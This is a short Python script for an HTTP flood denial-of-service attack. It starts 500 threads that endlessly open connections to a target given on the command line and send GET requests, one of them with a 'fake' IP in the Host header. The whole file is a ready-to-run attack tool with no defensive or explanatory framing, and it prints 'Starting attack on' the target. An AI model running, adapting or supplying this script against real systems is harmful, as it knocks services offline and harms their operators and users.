import socket
import threading
import random
import os
import sys

# Configuration
target = sys.argv[1]  # Target domain or IP
port = 80  # Default port for HTTP
fake_ip = '182.21.20.32'  # Fake IP address
threads = 500  # Number of threads

# Function for attack
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode('ascii'), (target, port))
            s.sendto(f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n".encode('ascii'), (target, port))
            s.close()
        except:
            pass

# Main execution
print(f"Starting attack on {target} with {threads} threads...")

for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()
